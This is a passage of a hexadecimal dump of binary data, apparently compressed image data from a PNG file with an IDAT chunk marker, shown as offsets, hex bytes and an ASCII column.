00006700: 472a a42c 0bcd c931 bbdc fc89 d747 4fcd  G*.,...1.....GO.
00006710: 1287 3e43 8305 c686 8bb4 7a49 0fc6 4e19  ..>C......zI..N.
00006720: 5cb5 b9c4 cbc7 66f1 3d89 6126 bc2a c330  \.....f.=.a&.*.0
00006730: 7152 0ea6 6591 ce64 d6f4 09d6 6e78 5dc5  qR..e..d....nx].
00006740: 9477 4c32 e998 febc 8e54 d1cf 6228 251d  .wL2.....T..b(%.
00006750: 7db8 84d8 cda5 1d46 c5ef fdf7 b3a2 9873  }......F.......s
00006760: 985b 6c61 9afa 5a92 bb01 a686 e618 f4e5  .[la..Z.........
00006770: 7552 6987 52d1 4658 1686 2b30 7539 2014  uRi.R.FX..+0u9 .
00006780: 8b33 2bd1 b7bf fdcc b90f bce7 ad3b ffe1  .3+..........;..
00006790: 1f0f 9ce3 f0c9 3aef 78cb 289b 871d 16eb  ......:.x.(.....
000067a0: 3ecd 5e4c 8841 ae98 e6ca 6d05 aa7d 05fa  >.^L.A....m..}..
000067b0: dc98 4637 64b5 d1a3 98b1 b87a 6791 a58e  ..F7d......zg...
000067c0: 4eb3 d141 3312 f074 366b f296 3bae e1ba  N..A3..t6k..;...
000067d0: eb8e f0c4 f70e 522d 68d4 1b31 99ac c28c  ......R-h..1....
000067e0: 1226 90e3 9874 ba11 375d 9903 dd46 ea0e  .&...t..7]...F..
000067f0: 27cf 2d73 fd0d 43d8 4e8a 8533 d39c 3f33  '.-s..C.N..3..?3
00006800: c15c ad83 ff8f c7b8 787e 91b9 9905 def9  .\......x~......
00006810: ce1b 78cb 6d57 e0b5 5d4e 1f3b 43b6 3248  ..x.mW..]N.;C.2H
00006820: b5cf 258a 426a 7517 4337 78f0 ddb7 3234  ..%.Bju.C7x...24
00006830: 3248 2e97 46d3 a05e ef70 76ba cb95 37bd  2H..F..^.pv...7.
00006840: 85f9 89d3 3c77 f414 b3b3 abc4 bac6 c163  ....<w.........c
00006850: 0ba4 5356 f2de 8d98 42c6 c48f 0441 1861  ..SV....B....A.a
00006860: e93a 3b36 1718 aaa6 490b 83e1 be2c e54a  .:;6....I....,.J
00006870: 8e33 93cb d829 93ad e305 5e3d 56c7 f592  .3...)....^=V...
00006880: 16a1 ae69 98a6 8561 9814 f20e b693 a25a  ...i...a.......Z
00006890: 7070 1c0b c732 ef88 e278 56ad e534 9c5f  pp...2...xV..4._
000068a0: e8f1 bb5f 9c11 0b5d 8f48 0ae4 25e9 5f4a  ..._...].H..%._J
000068b0: 29e4 da5f a5c4 cfb7 22d4 5a1e ad76 f203  ).._....".Z..v..
000068c0: d8d0 2a9a 0629 5391 b10c 4606 0a94 0b16  ..*..)S...F.....
000068d0: a355 1bdb 1684 9140 3754 5508 b128 a564  .U.....@7TU..(.d
000068e0: a11e 3cf2 bd67 cefc c707 deba eb77 9e7e  ..<..g.......w.~
000068f0: 658a d576 8fdb af1e 647a d6a7 d1f5 e9f6  e..v....dz......
00006900: 428e 9c5a 4cb2 122c 1b19 4956 da21 2a0a  B..ZL..,..IV.!*.
00006910: d9b3 b9c0 edb7 6ca7 9cc9 3135 5b27 8835  ......l...15['.5
00006920: 8a79 8381 4a9a 72d5 e177 ffdd 07b9 62db  .y..J.r..w....b.
00006930: 10ff ed8b 8f93 494b ba3d c1a6 7e36 dad2  ......IK.=..~6..
00006940: 1205 9a91 9c26 b239 062a 0e9e eb11 c43a  .....&.9.*.....:
00006950: 6ea0 31d4 97e1 9e5b c638 717e 95e2 8e34  n.1....[.8q~...4
00006960: 4395 4106 87ab 942a 1584 dee1 bef7 bc1d  C.A....*........
00006970: 2795 6265 b54d bdde c436 2c56 571b e432  '.be.M...6,VW..2
00006980: 1685 521a b71b 7071 6685 9e1b 323a 3ec8  ..R...pqf...2:>.
00006990: f973 5364 b205 22ab c0cc e219 5ce9 d075  .sSd..".....\..u
000069a0: 630a 5987 9421 18ea b308 3d68 b522 8a15  c.Y..!....=h."..
000069b0: 1343 1854 2b29 3219 0b5d 138c 8c57 8822  .C.T+)2..]...W."
000069c0: 8843 c1ae ed7d 9c38 b580 e7b9 68da ba4e  .C...}.8....h..N
000069d0: 41c3 300c 6cdb a65c 75c8 170a f40d 7648  A.0.l..\u.....vH
000069e0: a51c 9cb4 71a7 eb46 cf08 2d69 8ca1 62ce  ....q..F..-i..b.
000069f0: 2f35 8842 fd32 37f4 1bfb 401b 2bc2 fa13  /5.B.27...@.+...
00006a00: a2ad b964 13d9 9942 5bab 3235 2d11 87e8  ...d...B[.25-...
00006a10: 6b84 0d29 c0d2 158e a1b6 5b69 c10d 5797  k..)......[i..W.
00006a20: 19db 3ec8 ce85 268e a513 7a31 866e 8e08  ..>...&...z1.n..
00006a30: 11bf 26a5 2488 6366 6af2 771f df3f c183  ..&.$.cfj.w..?..
00006a40: 776f fb9d d74e ae72 e74d 1536 8f67 5868  wo...N.r.M.6.gXh
00006a50: 7aac 347b 3cf9 ec05 9e7c ea1c 8383 16dd  z.4{<....|......
00006a60: 5ecc d47c 888a 353e fabe ad54 8a0e 239b  ^..|..5>...T..#.
00006a70: 4758 9877 9166 06d3 c8d0 d45b 2063 368f  GX.w.f.....[ c6.
00006a80: 0df3 ee77 dec0 e050 8997 5f39 c3df ffcf  ...w...P.._9....
00006a90: e7d0 d6e8 6b00 e355 b8eb dedb b8f5 963d  ....k..U.......=
00006aa0: 6cdd d247 310d d373 4da4 2990 68e4 f369  l..G1..sM.).h..i
00006ab0: 064a 365d 3743 395f 4637 0dba 5270 f8f8  .J6]7C9_F7..Rp..
00006ac0: 45ba 5d9f a1e1 2aa6 e1d3 6c76 8982 1015  E.]...*...lv....
00006ad0: c72c 2f37 3878 6492 5637 a6d3 0b08 2349  .,/78xd.V7....#I
00006ae0: 2693 e6e2 8539 da8d 3acb ae4b bbe7 33db  &....9..:..K..3.
00006af0: 0453 8b19 ebcf b3da 0ed9 3e92 219b 3758  .S........>.!.7X
00006b00: 5d95 6cdf 54c0 0da1 5a72 883c 0d0f 9d81  ].l.T...Zr.<....
00006b10: a10c f972 96b9 b93a 9bb7 0d32 716e 9130  ...r...:...2qn.0
00006b20: 5068 868e eecb 0d16 b3d0 9250 b5d1 c122  Ph.........P..."
00006b30: 83e3 03ec ed49 8416 92b6 ad7b e3c0 5f16  .....I.....{.._.
00006b40: 6b38 5d85 0265 8288 8965 b896 e892 289e  k8]..e...e....(.
00006b50: 9240 12f5 ff4f 36f4 1a73 991d 3b07 e8eb  .@...O6..s..;...
00006b60: cf32 b6a9 8f5e 3b44 3714 86c9 e8ba ee40  .2...^;D7......@
00006b70: 4941 0c2c d4dc df7d 62ff b96b de79 d7b6  IA.,...}b..k.y..
00006b80: 0756 9a21 6fbf 6980 e9f9 0eed 8e8f d4a0  .V.!o.i.........
00006b90: a734 0c2d d126 04b1 4e25 af73 f86c 0dd3  .4.-.&..N%.s.l..
00006ba0: 3ec1 ed37 87e4 8a45 5c65 d2ee e898 9a49  >..7...E\e.....I
00006bb0: 1875 c916 5d06 06f2 dc7d c71e b66c 19e4  .u..]....}...l..
00006bc0: faeb af60 b9de a6d1 e8e0 878a ade3 156e  ...`...........n
00006bd0: be71 277b 768f 9149 e9f4 5a4d 3279 c54a  .q'{v..I..ZM2y.J
00006be0: 3bc2 ed75 3134 49a7 dd4b c8a9 9641 b1e0  ;..u14I..K...A..
00006bf0: 102e b738 fed2 31dc d862 eab4 2097 b168  ...8..1..b.. ..h
00006c00: b902 61e8 3816 cc2f ac26 723d cf4b 08f5  ..a.8../.&r=.K..
00006c10: 2303 e822 e6c4 b193 8c0e 6679 6eff 118e  #.."......fyn...
00006c20: 1d9f 25ed 580c 0d3a d4db 2185 8cc0 0d15  ..%.X..:..!.....
00006c30: 4143 52ed 4b23 1014 b33a a303 0510 3ad5  ACR.K#...:....:.
00006c40: fe34 4323 55e2 48d0 57ad 3273 7105 04d8  .4C#U.H.W.2sq...
00006c50: b68d 17c8 0d35 f4eb 9635 a854 73e4 f30e  .....5...5.Ts...
00006c60: 4323 0516 e66b 9748 0e5f eff0 4af5 fa71  C#...k.H._..J..q
00006c70: 71bd 4804 fdcd f508 c989 2139 3dac bfd0  q.H.......!9=...
00006c80: ba3e 21d9 73e4 5a8b d3a0 9c4d b379 c47b  .>!.s.Z....M.y.{
00006c90: 7a61 d1ff e520 8878 e9a5 f3d4 6b2d 4e9d  za... .x....k-N.
00006ca0: 9965 cfd6 3146 fb2a a41d f30b ffe5 cbc7  .e..1F.*........
00006cb0: bf28 3089 6448 100b f448 3253 0bde fdbd  .(0.dH...H2S....
00006cc0: 0317 9e78 dfdd dbde beb9 ea70 f355 03ac  ...x.......p.U..
00006cd0: f424 d3b3 6d4c 038e 9cf4 9048 8452 d41b  .$..mL.....H.R..
00006ce0: 49f4 8eaf 96a8 357a fc9b 8fdd c7f2 ca2a  I.....5z.......*
00006cf0: a727 1608 b76d 63e7 b67e 8250 1278 3d2c  .'...mc..~.P.x=,
00006d00: c3e4 c6eb 7772 e79d d7d0 edb8 d4eb 2d22  ....wr........-"
00006d10: 9514 8fba a6d1 ed85 a060 b119 31be 6998  .........`..1.i.
00006d20: e557 2799 999c 60cf 9849 3e6b 9352 068d  .W'...`..I>k.R..
00006d30: 6e84 5feb 51c8 3abc f71d fb58 6987 e453  n._.Q.:....Xi..S
00006d40: 824a 5e70 e8c4 22c7 279b a4d3 36bb 36e7  .J^p..".'...6.6.
00006d50: 181d 1ba1 98d3 0902 9f33 13c7 78b5 29b9  .........3..x.).
00006d60: f1c6 bd7c ffbb cfb2 b0d0 c4b4 0dc6 0633  ...|...........3
00006d70: 345a 928c a3d3 5fc8 e0c6 50c8 5b64 d326  4Z...._...P.[d.&
00006d80: 8614 8c0d e4b0 4d28 97b2 9407 4b64 0a59  ......M(....Kd.Y
00006d90: a4a7 9899 ada1 1926 f97c 1e54 8fae 1b12  .......&.|.T....
00006da0: e982 584a 6eda 5ba2 5249 d368 c1c4 9979  ..XJn.[.RI.h...y
00006db0: 7cd7 677e ba49 a512 e105 e18b 0345 fd63  |.g~.I.......E.c
00006dc0: c5bc 85d0 7462 42b4 5811 c6eb b894 e4b4  ....tbB.X.......
00006dd0: 15af 7790 2f11 0deb 8e75 49ec ef06 1267  ..w./....uI....g
00006de0: 9db0 212f 0171 26d9 4e77 5c3b f291 b7df  ..!/.q&.Nw\;....
00006df0: 507a 78b4 9cd9 f4cc d1e5 7f7b e5ae e27f  Pzx........{....
00006e00: 387c bc7e 646a aa31 b8da f0fc 81be 8211  8|.~dj.1........
00006e10: 8511 334b 0d0e 9fae ff5e 1c27 b2b0 0fbd  ..3K.....^.'....
00006e20: 75ab 7aef 3d5b ffc3 cc7c 77d7 72dd ffcd  u.z.=[...|w.r...
00006e30: e55a f7d7 766d abd8 6383 292e 4e37 6975  .Z..vm..c.).N7iu
00006e40: 23fc 2881 4286 51f2 fa01 1086 0a19 c52c  #.(.B.Q........,
00006e50: acba 04bd 0e37 dfb4 836a 29cd a1a3 d38c  .....7...j).....
00006e60: 0ce6 7163 8b4a a540 a99c c332 353a ed36  ..qc.J.@...25:.6
00006e70: 1317 eb94 8b29 2ac5 34ba 0ce8 b43b c468  .....)*.4....;.h
00006e80: 544b c960 e9ec d969 1e7f ec05 fcd9 53ec  TK.`...i......S.
00006e90: da36 0456 8e7c 5aa7 3eb7 c8c4 9969 8e1d  .6.V.|Z.>....i..
00006ea0: bbc8 fcdc 22c5 2cb4 7a31 c74f 2fe1 5882  ....".,.z1.O/.X.
00006eb0: c16a 9aae 1b22 7b4d 565b 3dca c50c 9b46  .j..."{MV[=....F
00006ec0: 4a38 96ce f1e3 53bc 7cf0 2ce7 cecc d36a  J8....S.|.,....j
00006ed0: 076c 1ac8 d3ec fa0c 546c 8ab9 1441 1452  .l......Tl...A.R
00006ee0: c85a 8c0c e491 28aa 1587 4a29 4bbe 90a6  .Z....(...J)K...
00006ef0: 3c50 a6d4 5f04 65b0 bc50 2708 2332 9902  <P.._.e..P'.#2..
00006f00: 9b76 8ca3 9b16 2bcb 0d3a ae47 c7f5 a9e4  .v....+..:.G....
00006f10: 6d34 055d cfe3 f444 83b9 b926 73b5 2e95  m4.]...D...&s...
00006f20: 3cbc 72b4 f6e9 87ef 1af8 e078 4967 6a39  <.r........xIgj9
00006f30: 189a 9a6f 3f16 858a 686d 3e14 af3b d6d1  ...o?...hm>..;..
00006f40: 2ea9 11d4 4fc0 eba9 e4f4 c09a 2844 5b3b  ....O.......(D[;
00006f50: 3db0 5659 c69a ce81 d766 fff6 da6d f697  =.VY.....f...m..
00006f60: a716 dd93 bd1e 785d c1f4 62fb 36d3 d4b7  ......x]..b.6...
00006f70: 0a15 dbf5 56f3 e09f 7c65 5204 be24 5c4b  ....V...|eR..$\K
00006f80: 1753 31e4 8b3a b954 4426 ad3f 305b 0f7f  .S1..:.TD&.?0[..
00006f90: 69ae 261f fada 13a7 9f7a f89e 9dbc fbae  i.&......z......
00006fa0: 316a ad98 eec5 26b9 b449 1006 b891 c20c  1j....&..I......
00006fb0: 0568 4982 5b21 b478 ea95 6972 f923 5c7f  .hI.[!.x..ir.#\.
00006fc0: d508 775e 5de6 d4d9 59ba ee34 7b76 8e30  ..w^]...Y..4{v.0
00006fd0: 325c c14e 253a 809d 2326 3dd7 e5fc f926  2\.N%:..#&=....&
00006fe0: 6e28 711c 0b5b c0b9 0b75 0e1f 9d62 667a  n(q..[...u...bfz
00006ff0: 9abb 6fac b067 cb36 a41f 72fc d414 8bc5  ..o..g.6..r.....
00007000: 32fd fd7d dcba 7928 498b b552 a4d2 6924  2..}..y(I..R..i$
00007010: 1a61 e0d3 eef4 e8b9 019b 360f 5129 17f1  .a........6.Q)..
00007020: fd80 c64a 9def 3e71 9457 5ebd 48bb ed32  ...J..>q.W^.H..2
00007030: 71b1 83a9 49aa d534 cbab 1e7d a514 e582  q...I..4...}....
00007040: 8181 8967 6a0c f5e5 0883 9072 294b 7f39  ...gj......r)K.9
00007050: 4d26 eb50 ed2f 511a aca2 1b3a b5b9 65fc  M&.P./Q....:..e.
00007060: 2040 4580 aed0 5359 6cbb 8322 260a 2551   @E...SYl.."&.%Q
00007070: a4f8 e181 5922 2567 eebd be3a 3a5f 6b12  ....Y"%g...::_k.
00007080: 87f8 ed30 fabb 2bc7 2aff 5ba7 eb7f fdc9  ...0..+.*.[.....
00007090: 83ab 8c96 0547 4ed7 3eee c78a 5029 6225  .....GN.>...P)b%
000070a0: d732 cacc 44c3 a0e2 352d 8358 0f8c fff9  .2..D...5-.X....
000070b0: 6a84 759d 8110 02b7 ab71 6eba fbb8 61e9  j.u......qn...a.
000070c0: 23fb 7697 1fdb d16f 72ed ce6a effb 0797  #.v....or..j....
000070d0: 4446 d370 2345 d78f 8822 0da5 9238 3e34  DF.p#E..."...8>4
000070e0: 832f 7ce3 9cf8 b507 37ab 174f 370a 1943  ./|.....7..O7..C
000070f0: e223 5e9d 5d0e eefb c693 e7be fffe 7bb6  .#^.].........{.
00007100: 70ff 4d83 7841 c8c4 b44b a568 b3bc 1212  p.M.xA...K.h....
00007110: 9931 c365 8b40 2996 5622 5872 79ec 89e3  .1.e.@).V"Xry...
00007120: acd4 bb5c 75e5 187d 0365 fa8b 5926 272f  ...\u..}.e..Y&'/
00007130: 72f6 dc0c 8562 865c d6c1 b24c c647 cb89  r....b.\...L.G..
00007140: 4d5f 3768 b67a cc4d cfe1 0792 e6cc 6976  M_7h.z.M......iv
00007150: f71b 6cae e470 db1d 16ea 3ec3 5bc7 0983  ..l..p....>.[...
00007160: 88ac a568 b73a d49b 1e61 0cc2 48fa 23db  ...h.:...a..H.#.
00007170: 3657 a8e4 6d0c 21e8 767d baab 3566 963a  6W..m.!.v}..5f.:
00007180: bcfa ea14 878e 4c72 f878 8d8e 3218 2ada  ......Lr.x..2.*.
00007190: 9472 36ab 758f b4e3 1028 49d7 d730 b480  .r6.u....(I..0..
000071a0: b1a1 2261 a0c8 174d 2a7d 6bb6 fc72 8edc  .."a...M*}k..r..
000071b0: 6011 c3b1 e82c aee0 792e 41e0 e376 9248  `....,..y.A..v.H
000071c0: 6343 539c 3c33 43bb e9e2 7931 7ef2 71c4  cCS.<3C...y1~.q.
000071d0: 0b83 177d 2ffe 58bd e1ff a9ef cb57 6fda  ...}/.X......Wo.
000071e0: 9dfd c278 4567 f726 2796 71c8 a9d9 70a6  ...xEg.&'.q...p.
000071f0: d151 9778 472e 8f01 7c93 3e42 92de b63e  .Q.xG...|.>B...>
00007200: 6dd4 b4c4 157c d9e9 e112 dbab b224 1fbc  m....|.......$..
00007210: 7be8 01a1 6b7c ffd0 ea35 ba10 3829 836e  {...k|...5..8).n
00007220: 4ff2 8177 0ca9 9d03 45c6 fbf3 6367 a69a  O..w....E...cg..
00007230: d342 5f0b 128d 255e 908c 94c3 20c4 171a  .B_...%^.... ...
00007240: 7a14 378c 40cc 2e2d 79ff eea9 57e6 3f7b  z.7.@..-y...W.?{
00007250: cfad 232c b43c 5cbf c6ec 5287 beb2 45ad  ..#,.<\...R...E.
00007260: e925 02b6 b5b9 7bad 1e21 6338 f9b5 13dc  .%....{..!c8....
00007270: 707a 99f7 bd6b 1fa5 6a84 dbee 522a 66c9  pz...k..j...R*f.
00007280: db29 dc6e 8bf3 931d 22bf 472f d451 0822  .).n....".G/.Q."
00007290: b74d b7b9 8266 5814 f326 7d03 65ba 8146  .M...fX..&}.e..F
000072a0: 1449 d2f9 3c39 c760 6ab9 4e6d bacd f9d9  .I..<9.`j.Nm....
000072b0: 06e7 2e2c e3bb 1dec 749a 9263 71d5 de2d  ...,....t..cq..-
000072c0: e40a 393c 5fb2 526f d3e9 3438 3bd5 607e  ..9<_.Ro..48;.`~
000072d0: a1ce ec92 4f2c 0c36 571d 1431 4b4d 8fb4  ....O,.6W..1KM..
000072e0: 6920 7489 a69b 44a1 6068 244b e4c7 0cf4  i t...D.`h$K....
000072f0: 65a8 9652 d8e8 948a 2532 a51c 293b 8db7  e..R....%2..);..
00007300: 5ca7 d3ec d26d fb74 3a3e 9d6e 40e0 2bca  \....m.t:>.n@.+.
00007310: 8e60 6ebe 4ebd d9a3 d375 e979 ee33 9e17  .`n.N....u.y.3..
00007320: bf54 2c58 bf39 d62f b863 6ff6 938f 3c55  .T,X.9./.co...<U
00007330: 13a6 2ebe 606b 925c 5670 dfbe 22b1 92a3  ....`k.\Vp.."...
00007340: df7d 6e89 3812 6b08 5e0d 2993 84ec 4b8b  .}n.8.k.^.)...K.
00007350: c775 4682 10ff c453 838c 6342 15f3 8323  .uF....S..cB...#
00007360: 2bec 1e2b f295 1f5c 10cf 1f9d 677e c525  +..+...\....g~.%
00007370: d614 858c 8163 0664 32e6 0332 169f 4b42  .....c.d2..2..KB
00007380: c140 5f2b 3e4d 3381 5a85 a122 44d0 d3e4  .@_+>M3.Z.."D...
00007390: 6b42 48fb f4c5 ee7f ac14 9abf f3c0 ad43  kBH............C
000073a0: 743b 3e2f c792 8bcb 6dfa 8a36 8b2b 3e48  t;>/....m..6.+>H
000073b0: 4529 6fd1 6a46 d49b 11a5 acce 6ba7 5679  E)o.jF......k.Vy
000073c0: eef0 0f28 c4f0 895f bf95 2d63 55fa 8a36  ...(..._..-cU..6
000073d0: 71e8 93d1 04ad a519 8230 4488 64ba 592d  q........0D.d.Y-
000073e0: a5b0 6c9b ae97 a6ee ea2c 3503 fa0a 367d  ..l......,5...6}
000073f0: b6c1 e4e9 0b3c fbf2 2407 0fcf e2c6 16a6  .....<..$.......
00007400: 25e8 fa92 b4d9 03c3 e599 c32f 9356 3129  %........../.V1)
00007410: d3a5 5434 3872 21e0 c8b9 803b 6ee9 c7c9  ..T48r!....;n...
00007420: a448 a7d6 c423 9a45 c632 304d 13d3 34c8  .H...#.E.20M..4.
00007430: 583a 837d 366e 2f62 b09a a654 35c8 3a36  X:.}6n/b...T5.:6
00007440: 99ac 43ae e0e0 e4b3 7456 1bb4 5712 3a7d  ..C.....tV..W.:}
00007450: bbed d3ed f874 7b01 bd6e 88d7 afb3 5a6f  .....t{..n....Zo
00007460: d36a 07f4 bac1 11cf 8d5f f2dc e845 a76c  .j......._...E.l
00007470: 7eca 3134 b229 41cb e500 f51f 0000 1ecc  ~.14.)A.........
00007480: 4944 4154 ebf1 773f 70c5 779e 8399 259f  IDAT..w?p.w...%.
00007490: bdc3 39f5 da64 0737 8e5e 7794 6d9c 16de  ..9..d.7.^w.m...
000074a0: 5c7e b216 002a d752 de2e cf75 da88 025e  \~...*.R...u...^
000074b0: b761 e972 83c8 f5e1 b76e 3a11 fafe e4e3  .a.r.....n:.....
000074c0: 2fd4 dead e90a a149 9c94 60a8 bfcc d44c  /......I..`....L
000074d0: 7d2d 0320 3975 189a 8161 2ade 73f7 b032  }-. 9u...a*.s..2
000074e0: 759d ef3c b728 34a1 6199 3119 dbd0 1c5b  u..<.(4.a.1....[
000074f0: bb23 6b1b 0fbf ed2d e39f 1ceb cff0 d5ef  .#k....-........
00007500: 9de5 d0e9 26d3 8b6d 2ccb 6679 d5c7 9331  ....&..m,.fy...1
00007510: d5ac 41d7 4fb2 1873 b6c0 320d da6e 4428  ..A.O..s..2..nD(
00007520: 1551 acf8 d4af 5cc9 bbdf 7e25 a39b 0691  .Q....\...~%....
00007530: 4aac f10f 226a ab3d babe 249b cb30 3db5  J..."j.=..$..0=.
00007540: ccca 4a0b a210 e177 589e 5f60 ffe9 1eb5  ..J....wX._`....
00007550: ba4f 216b d3ec 066b 3754 c34e 99d8 8e41  .O!k...k7T.N...A
00007560: 29ab 333a 94e5 ab8f 1de3 d62b 0bbc 7631  ).3:.......+..v1
00007570: 24f0 1485 8c8d 1b49 c238 4637 7432 a689  $......I.8F7t2..
00007580: 656b 641c 9b4a d1a2 52b6 91b1 4621 63d3  ekd..J..R...F!c.
00007590: 574a 313c 5ca2 50b2 e8ef 2f33 345c c575  WJ1<\.P.../34\.u
000075a0: 7dea 2b6d 3c2f a0db f169 757a 743b 3ebd  }.+m</...iuzt;>.
000075b0: 4ec8 e870 9a96 eb73 f0d8 0a3d d73b d2eb  N..p...s...=.;..
000075c0: 853f 74bd e019 df97 477c 4f4e 578a d66f  .?t.....G|ONW..o
000075d0: 2dd6 bb7f d2ee c678 4144 1445 bced ba52  -......xAD.E...R
000075e0: b36c 5bf9 bffa e1ac 88e3 7823 f43c 0ad7  .l[.......x#.<..
000075f0: 064f 1bd1 c06f 5028 fdbc 9dc5 1fab 15d0  .O...oP(........
00007600: 78f4 e9d9 3d9f fec5 3dea 7baf 2c12 4582  x...=...=.{.,.E.
00007610: 0fde 3dee bded daaa fde8 730b 9fbf 30ad  ..=.......s...0.
00007620: 3e9e bc50 921c abe9 31a9 94c9 8baf 76c4  >..P....1.....v.
00007630: 3d37 57d4 fbee 1c57 df78 f682 8822 9d24  =7W....W.x...".$
00007640: ec56 3d0d f0c3 1766 8277 df3e faa9 0fbf  .V=....f.w.>....
00007650: 7d13 7001 1d9d a9e5 167d 1583 7a53 b2d2  }.p......}..zS..
00007660: 0aa9 e452 64d2 214b 7589 1e84 e4d3 0631  ...Rd.!Ku......1
00007670: 31dd 367c 6fff 04c5 82c3 3bb3 2656 26cb  1.6|o.....;.&V&.
00007680: fc6a 4821 6f13 49c5 c143 937c ebfb c7e9  .jH!o.I..C.|....
00007690: f412 8979 b59a 2208 6326 a756 595c 0969  ...y..".c&.VY\.i
000076a0: b415 c8ce da52 9920 ec0d 40d7 056a 2dd2  .....R. ..@..j-.
000076b0: c836 350e 9ef1 b09d 4400 b2d0 f428 666c  .65.....D....(fl
000076c0: 7229 9358 263c 08d3 34a8 1405 19cb a0d7  r).X&<..4.......
000076d0: 55e4 7226 b6ad 61d9 4947 309f cf53 ed2f  U.r&..a.IG0..S./
000076e0: d06a b9d4 6a75 024f e2ba c983 d0e9 2554  .j..ju.O......%T
000076f0: 99d1 a134 2d37 e495 a335 3c37 3ce9 79d1  ...4-7...5<7<.y.
00007700: 8bbe 1b1d f103 7924 f0d5 b41b 85f4 1552  ......y$.......R
00007710: 7ffc b107 b6fc f113 2fb7 7874 ff45 114b  ......../.xt.E.K
00007720: c935 5bb2 f93f fcf2 05b1 ee31 5d1f 2aad  .5[..?.....1].*.
00007730: b79c f929 9203 63dd 0b2b 251b b5c2 7a1f  ...)..c..+%...z.
00007740: 41bd 49ad 2095 c28b 235e 9daa 7de9 e1db  A.I. ...#^..}...
00007750: fbbd bf7d 6a39 55cc 9876 c616 6c1a c97c  ...}j9U..v..l..|
00007760: 4cbe 627e 5ca8 24f9 0520 651a f497 2ce7  L.b~\.$.. e...,.
00007770: 96ab 077a 8194 6453 11ef ba7d 483d f6f4  ...z..dS...}H=..
00007780: bc90 6838 0274 15bf 0421 dfd9 3f93 bbff  ..h8.t...!..?...
00007790: b6d1 8f7d e8fe 6d64 ccf3 68a7 05d3 f35d  ...}..md..h....]
000077a0: aa39 8b8e 1152 6f7b 3829 9d4d 0329 eacd  .9...Ro{8).M.)..
000077b0: 003f 48f8 8485 bc41 aba7 78f2 e569 3a7e  .?H....A..x..i:~
000077c0: ccdb efd8 8e2e 042f 1faf f3ca 6b8b 4c5e  ......./....k.L^
000077d0: 5ce5 f923 4b08 a5e3 9892 4ad9 a217 2956  \..#K.....J...)V
000077e0: 1b21 95ac 9e38 96d7 34ff 0a8d 9c2d 18e9  .!...8..4....-..
000077f0: b7e8 f909 4dca 3405 3a92 762f a6de 4e80  ....M.4.:.v/..N.
00007800: de79 4ba2 e931 8666 2135 4136 a551 2ddb  .yK..1.f!5A6.Q-.
00007810: 442a 2452 12db 11a4 6c48 672d ca95 3c03  D*$R....lHg-..<.
00007820: d50c c303 799a 8d36 8b0b 6d82 c027 f015  ....y..6..m..'..
00007830: ae17 e076 433a 6ec4 e850 16d7 0d99 9dab  ...vC:n..P......
00007840: 53c9 2b26 1af2 45d7 8ff6 0791 3ae9 85f1  S.+&..E.....:...
00007850: b41f 4aa2 18b6 0f38 a44d 835c 5623 882c  ..J....8.M.\V#.,
00007860: de7f 7b51 bd74 b6fb a21b c9cb b489 c94a  ..{Q.t.........J
00007870: b076 0fe5 fa4a 20de 6c6b b83c 1bfa d294  .v...J .lk.<....
00007880: f84b b70c 4dc4 af47 d36b 1a9a b0f9 f7bf  .K..M..G.k......
00007890: 3ca2 fef3 dfcf 8828 0ed8 3c98 e6a1 3b37  <......(..<...;7
000078a0: a989 a9c6 d79f 3854 7fbf 2124 a605 a55c  ......8T..!$...\
000078b0: 8aab b7e7 9ffe f46f bde5 ce28 8af8 7fff  .......o...(....
000078c0: ec65 b68c a620 d4f8 f6f3 d342 d793 74b3  .e... .....B..t.
000078d0: 94a3 6b69 53bb 37e3 380f bcf5 a6ea 2777  ..kiS.7.8.....'w
000078e0: 8c66 f8de 73f3 1c38 5667 72be 4318 c648  .f..s..8Vgr.C..H
000078f0: 2159 68c4 e891 c6d0 a0c6 a601 9b48 1a1c  !Yh..........H..
00007900: 7875 154b 874c d626 9715 3cfc 8edd e452  xu.K.L.&..<....R
00007910: 1aaf 9e9c e33b cf2c 92cb ebe4 6c33 69ab  .....;.,....l3i.
00007920: ea3a a608 d00c 4535 6d33 3264 707e 2ee2  .:....E5m32dp~..
00007930: f0a9 eeba 7f9d 81b2 ce48 59a7 e70b a697  .........HY.....
00007940: 5d94 3249 a575 b296 8554 71e2 4896 605a  ].2I.u...Tq.H.`Z
00007950: 60a7 93d9 87a5 9b44 51c4 7557 55a9 146c  `......DQ.uWU..l
00007960: 16eb 11c5 8ccd d050 8e2d 6355 46c6 f334  .......P.-cUF..4
00007970: 5703 66e7 dbc4 5192 d310 f812 d70b e8f5  W.f...Q.........
00007980: 42b6 8ce4 e878 1187 4ecc f391 fb37 03f0  B....x..N....7..
00007990: 275f 79ed 4b8d 96f7 6781 2f4f f682 d0f5  '_y.K...g./O....
000079a0: 7dc9 4dbb b36a eb58 8e6f 3e35 27a6 6b01  }.M..j.X.o>5'.k.
000079b0: 462c f9f5 8737 ab3f fcca 8488 c388 2896  F,...7.?......(.
000079c0: 1bd9 d089 ac40 bf4c 6b2a d07e 7c6b 58ef  .....@.Lk*.~|kX.
000079d0: 1ebe 5199 a469 1a2a 4126 22b4 d78b 0d4d  ..Q..i.*A&"....M
000079e0: d350 225a d32c fa34 dbe0 d882 d50e 9c9f  .P"Z.,.4........
000079f0: ebf1 e7ff 7046 fce6 07b6 2aa5 795f 79e2  ....pF....*.y_y.
00007a00: 70f7 9774 2589 22c9 4acb fdcc c973 cb4f  p..t%.".J....s.O
00007a10: 1532 2906 aa0e 4fbc b8c0 ddd7 9678 d7ed  .2)...O......x..
00007a20: 43ea f1fd 0bc2 d362 7457 4857 b25f a99e  C......btWHW._..
00007a30: ffe4 8139 3a57 0f7c f281 bb46 18a8 a4f8  ...9:W.|...F....
00007a40: e181 1a67 1656 6974 6236 576d 9a9d 905a  ...g.Vitb6Wm...Z
00007a50: 3d64 bc9a d918 b106 9122 6878 d45b 82cf  =d......."hx.[..
00007a60: 7df9 5552 69f0 2385 1249 9772 8590 f562  }.URi.#..I.r...b
00007a70: 59d3 04a6 d011 a321 7db1 81e7 4a22 9279  Y......!}...J".y
00007a80: 8b8e 6279 3522 123a 5e37 04a1 6159 1aa5  ..by5".:^7..aY..
00007a90: b441 cad6 596e 8568 3198 a6a4 5448 f21a  .A..Yn.h1...TH..
00007aa0: 3bbd 9894 2918 19c8 61db 49e8 79a5 6030  ;...)...a.I.y.`0
00007ab0: 58cd b265 4b85 9181 1c53 334d 5696 7b04  X..eK....S3MV.{.
00007ac0: 7148 1480 1f06 04be c40f 42c6 47b2 743c  qH........B.G.t<
00007ad0: 8fc3 271a 0c14 1c9a 4d97 e5d5 904e d7ff  ..'.....M....N..
